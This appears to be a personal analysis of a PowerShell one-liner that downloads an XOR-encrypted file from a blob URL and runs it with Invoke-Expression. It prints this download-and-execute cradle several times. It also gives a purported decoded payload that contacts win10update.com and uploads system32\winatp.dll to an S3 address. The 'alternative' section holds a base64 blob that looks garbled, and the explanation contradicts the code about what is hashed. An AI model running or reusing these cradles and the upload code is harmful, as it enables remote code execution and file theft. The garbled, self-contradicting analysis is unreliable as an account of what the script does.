### This is just for me to figure out what exactly happened.

```powershell
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;$xor    = [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');$base64String =   (Invoke-WebRequest -URI https://wcdstaticfilesprdeus.blob.core.windows.net/wcdstaticfiles/MTP_Fileless_Recon.txt    -UseBasicParsing).Content;Try{ $contentBytes =  [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0;    $decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i];  $i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression  ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
```

### Refactored for legibility

```powershell
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$xor    = [Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection')
$base64String = (Invoke-WebRequest -Uri https://wcdstaticfilesprdeus.blob.core.windows.net/wcdstaticfiles/MTP_Fileless_Recon.txt    -UseBasicParsing).Content
Try
{
  $contentBytes = [Convert]::FromBase64String($base64String) 
}
Catch 
{
  $contentBytes = [Convert]::FromBase64String($base64String.Substring(3)) 
}
$i = 0
$decryptedBytes = @()
$contentBytes.foreach{
  $decryptedBytes += $_ -bxor $xor[$i]
  $i++
  if ($i -eq $xor.Length) 
  {
    $i = 0
  }
}
Invoke-Expression  -Command ([Text.Encoding]::UTF8.GetString($decryptedBytes))
```


### An alternative avenue of this script would look like this 

```powershell
$encryptedString = "V2luQVRQLUludHJvLUljam9pbnM7JG94cgorICAgPSBbTmV0LlNlcnZpY2VQb2x5TWFuYWdlcl06OlRsczEyOyR4b3IgICAgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmcuXVVURjguR2V0QnVpbGRQYXJzaGluZ107JGJhc2U2NFMgdW5zaWduZWQgPSAoSW52b2tlLVdlYkJhc2lQYXJzaGluZyAtVXNlQmFzaWNQYXJzaGluZykLkNvbnRlbnQ7VHJ5eyAgJGNvbnRlbnRCeXRlc1sgZnJvbUJhc2U2NFMgc3RyaW5nKCRiYXNlNjRTdHJpbmcpICl9IENTdHJ5eyAgJGNvbnRlbnRCeXRlc1sgZnJvbUJhc2U2NFMuc3Vic3RyKGJhc2U2NFN0cmluZygzKSkgfSAmIENyZWF0ZyB7ICRjb250ZW50Qnl0ZXNzID0gW1N5c3RlbS5Db252ZXJ0XV06OlVURjguc2V0VGV4dCgnJGRlY3J5cHRlZEJ5dGVzIDsgJG94cisiKTsgJGkgPSAwOyBkZWNyeXB0ZWRCeXRlc1sgKCRkZWNyeXB0ZWRCeXRlc1sgKyAtYnhvciAkeHtfeHvCpignJGZpbGVuYW1lJyk7ICRpID0gMCsgZm9yZWNodHMoICRkZWNyeXB0ZWRieXRlcyArPSBfKyReKjsgJGkgPSAwKSA7IEludm9rZS1FeHByZXNzaW9uICsgKFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106JGRlY3J5cHRlZEJ5dGVzKQo=";
$encryptedBytes = [System.Convert]::FromBase64String($encryptedString);
$xor = [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');
$i = 0;
$decryptedBytes = @();
$encryptedBytes.foreach{
    $decryptedBytes += $_ -bxor $xor[$i];
    $i++;
    if ($i -eq $xor.Length) {
        $i = 0;
    }
};
$decryptedString = [System.Text.Encoding]::UTF8.GetString($decryptedBytes);
Invoke-Expression $decryptedString;
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
```

The original one-liner reads an encrypted string from a remote URL, decrypts it using a byte-by-byte XOR operation with a hardcoded key, and then executes the resulting script using Invoke-Expression.  
  
    
Now I want to find out what the 'encrypted string is at [https://wcdstaticfilesprdeus.blob.core.windows.net/wcdstaticfiles/MTP_Fileless_Recon.txt] .  
  
It is base64-encoded but also xor encrypted.  
  
Here are the contents of it (refactorred & formatted for legibility - no contents changed.)  

```powershell
Invoke-WebRequest -Method Get -Uri https://win10update.com/UTF8.GetEncoding -UseBasicParsing
$contentBytes = [System.Text.Encoding]::UTF8.GetBytes((Get-ChildItem Env: | Where-Object -FilterScript {
      $_.Name -eq 'windir'
}).Value)
$hash = [System.Security.Cryptography.SHA256]::Create()
$hashBytes = $hash.ComputeHash($contentBytes)
$hashString = [System.Convert]::ToBase64String($hashBytes)
$uploadUrl = 'https://s3.amazonaws.com/file-hosting-service/uploads/' + $hashString + '.txt'
(New-Object -TypeName System.Net.WebClient).UploadFile($uploadUrl, $env:windir + '\system32\winatp.dll')
```  
  
I will explain whata is going on by adding a comment after each line.  

```powershell
## Send an HTTP GET request to https://win10update.com/UTF8.GetEncoding.
Invoke-WebRequest -Method Get -Uri https://win10update.com/UTF8.GetEncoding -UseBasicParsing

## Get the value of the windir environment variable and convert it to a byte array using UTF-8 encoding.
$contentBytes = [System.Text.Encoding]::UTF8.GetBytes((Get-ChildItem Env: | Where-Object -FilterScript {
      $_.Name -eq 'windir'
}).Value)

## Calculate the SHA-256 hash of the byte array.
$hash = [System.Security.Cryptography.SHA256]::Create()

## Encode the hash as a Base64 string and construct a URL for file upload by concatenating it with a base URL.
$hashBytes = $hash.ComputeHash($contentBytes)
$hashString = [System.Convert]::ToBase64String($hashBytes)

## Upload 'winatp.dll' in the system32 directory of the current windir to the constructed URL using a WebClient object.
$uploadUrl = 'https://s3.amazonaws.com/file-hosting-service/uploads/' + $hashString + '.txt'
(New-Object -TypeName System.Net.WebClient).UploadFile($uploadUrl, $env:windir + '\system32\winatp.dll')
```

$hashString is the contents of the Base64-encoded SHA-256 hash of the contents of winatp.dll in system32 of the current directory - windir.
 
The value of ```$hashString``` is calculated by calling ComputeHash method of a SHA256 object, which is created by calling the Create method of the System.Security.Cryptography.SHA256 class. The ComputeHash method takes the byte array of winatp.dll file contents and computes the hash value.  

The byte array that you have decoded from the Base64 string is not human-readable in its current form. However, you can convert the byte array to a hexadecimal string, but we are not going to - as only leads us to the URL we ended up uploading the hash byte array to...
```powershell
### Will output byte array
[System.Convert]::FromBase64String("wruQPVhtGewNbraiplmogv1RJE1qE3zuNZWjhf2gQvE=")
```


The one-liner to inject code by doing the following:

Sets the security protocol to TLS 1.2 using the .NET class Net.ServicePointManager.
Encodes the string 'WinATP-Intro-Injection' as a byte array using UTF-8 encoding.
Sends a request to download the contents of the file MTP_Fileless_Recon.txt hosted on the web server at the specified URL using the Invoke-WebRequest cmdlet, and retrieves the content of the file as a string.
Tries to decode the contents of the file as a Base64-encoded string and convert it to a byte array using the .NET class System.Convert. If the content is not valid Base64-encoded, it will remove the first three characters from the string and try again.
Initializes a counter variable i to zero, and creates an empty byte array $decryptedBytes.
Loops through each byte of the content byte array $contentBytes, and XORs it with the corresponding byte of the byte array $xor using the bitwise XOR operator -bxor. The resulting byte is added to the $decryptedBytes array, and the counter i is incremented. If i reaches the end of the $xor array, it is reset to zero.
Converts the decrypted byte array to a string using UTF-8 encoding using the .NET class System.Text.Encoding, and passes it as an argument to the Invoke-Expression` cmdlet, which executes it as code.
The purpose of this one-liner is to download and execute the code contained in the MTP_Fileless_Recon.txt file. The specific actions taken by the injected code are not evident from the one-liner itself and would depend on the specific contents of the file being downloaded.










